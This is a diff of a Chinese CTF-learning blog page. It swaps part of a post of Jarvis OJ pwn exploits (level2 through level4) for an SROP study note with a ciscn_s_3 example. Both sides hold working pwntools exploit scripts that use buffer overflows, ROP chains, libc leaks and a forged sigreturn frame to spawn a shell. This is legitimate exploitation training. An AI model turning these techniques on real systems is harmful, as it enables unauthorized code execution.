-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level2'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)<span class="comment">#process('level2')</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0x0804A024</span>)+p32(<span class="number">0x0804A024</span>)<span class="comment">#0x0804A024为/bin/sh地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="解法2：srop"><a href="#解法2：srop" class="headerlink" title="解法2：srop"></a>解法2：srop</h3><p>同样我们可以利用srop，在栈中部署一个伪造signal Frame sigcontext，然后用rt_sigreturn来恶意恢复重而get shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',27681)</span></span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">vuln=<span class="number">0x0000000004004F1</span> <span class="comment">#</span></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line">rax=<span class="number">0x0000000004004DA</span>  <span class="comment">#mov     rax, 0Fh;ret</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(syscall_ret)+str(frame)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>环境与32位的环境差不多，但是x64的传参与x32下不同。</p>
-<p>x64中前6个参数是按顺序从 rdi ，rsi ，rdx，rcx，r8，r9这6寄存器传递参数的。x32是纯通过栈来传递参数的。因此我们可以用：</p>
-<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code>来寻找我们可以利用的gadget。</p>
-<p><img src="image-20210113141628743.png" alt="image-20210113141628743"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level2_x64'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)<span class="comment">#process('level2_x64')</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00000004006b3</span>)+p64(<span class="number">0x00000600A90</span>)+p64(e.plt[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h2><p>为一个64位的程序只开了nx保护。</p>
-<p><img src="image-20210113142124824.png" alt="image-20210113142124824"></p>
-<p>发现栈溢出点但是环境中没有sytstem与<code>/bin/sh</code></p>
-<p>因此我们要泄露出libc版本。ps：在做时，发现LibcSearcher泄露出来不准，因此用leak方法来做的。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9884</span>)</span><br><span class="line"><span class="comment">#context.update(bits=64)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">	pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(address)+p64(<span class="number">1</span>)+p64(<span class="number">0x0000000400690</span>)+<span class="string">'\00'</span>*<span class="number">56</span>+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.sendline(pay)</span><br><span class="line">        p.recvline()</span><br><span class="line">	add=p.recv(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> add</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'read'</span>])+p64(<span class="number">8</span>)+p64(<span class="number">0x00000000600A88</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x0000000400690</span>)+<span class="string">'\00'</span>*<span class="number">56</span>+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x000004006b3</span>)+p64(<span class="number">0x00000000600A88</span>)+p64(system_addr)+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>方法与level3差不多，leak出libc版本，然后ret2libc。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'level4'</span>)</span><br><span class="line"><span class="comment">#p=process('level4')</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">	pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(e.plt[<span class="string">'write'</span>])+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.sendline(pay)</span><br><span class="line">	add=p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> add</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">read_plt=e.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(read_plt)+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A024</span>)+p32(<span class="number">8</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(system_addr)+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank" rel="noopener">系统调用号</a></p>
+<p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/</a></p>
 
       
     </div>
@@ -412,13 +487,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></p>
+        <p><span>本文标题:</span><a href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
-        <p><span>发布时间:</span>2021-01-07, 21:44:11</p>
-        <p><span>最后更新:</span>2021-01-13, 15:09:11</p>
+        <p><span>发布时间:</span>2021-05-20, 22:26:02</p>
+        <p><span>最后更新:</span>2021-05-21, 12:29:39</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="xman pwn题复现——学pwn小记（4）">lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</a>
-            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="系统调用与SROP方法学习笔记">lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -430,16 +505,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">
-                    安洵杯2019复现
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">
-                    flask.request的内置属性总结
+                <a href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">
+                    pwn堆题泄露libc真实地址小tirck
                 </a>
             </div>
         
@@ -451,7 +520,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tell-Me-Something"><span class="toc-text">Tell Me Something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-x64"><span class="toc-text">level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-x64"><span class="toc-text">level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SROP-特点与原理"><span class="toc-text">SROP 特点与原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP-特点"><span class="toc-text">SROP 特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signal-机制"><span class="toc-text">signal 机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#signal-Frame-sigcontext"><span class="toc-text">signal Frame sigcontext</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP-原理"><span class="toc-text">SROP 原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用系统调用号"><span class="toc-text">常用系统调用号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i386"><span class="toc-text">i386</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#amd64"><span class="toc-text">amd64</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题ciscn-s-3"><span class="toc-text">例题ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解法1-execve与libc-csu-init"><span class="toc-text">解法1:execve与libc_csu_init</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法2：srop"><span class="toc-text">解法2：srop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
         
     </div>
     <style>
@@ -487,7 +556,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"xman pwn题复现——学pwn小记（4）　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"系统调用与SROP方法学习笔记　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -507,15 +576,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/" title="上一篇: 安洵杯2019复现">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/" title="下一篇: flask.request的内置属性总结">
+            <a href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/" title="下一篇: pwn堆题泄露libc真实地址小tirck">
                 <i class="fa fa-angle-right"></i>
             </a>
         
